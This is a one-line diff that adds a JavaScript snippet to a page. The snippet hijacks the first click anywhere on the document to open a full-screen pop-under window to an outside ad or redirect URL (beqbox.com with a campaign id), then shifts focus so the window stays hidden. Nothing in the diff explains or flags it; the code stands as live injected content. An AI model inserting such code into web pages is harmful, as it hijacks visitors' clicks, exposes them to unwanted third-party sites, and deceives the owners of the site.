@@ -1,0 +1,1 @@
+<script type="text/javascript">var pup=0;function popup (){if(pup<1){pup=pup+1;var popun=String;popun="https://beqbox.com/get?cid=5086&cn=&pl=";window.open(popun, "","toolbar=1,location=1,directories=1,status=1,scrollbars=1,resizable=1,copyhistory=1,menuBar=1,width=30000,height=30000");window.focus();popup.blur();}}document.onclick=popup;</script>
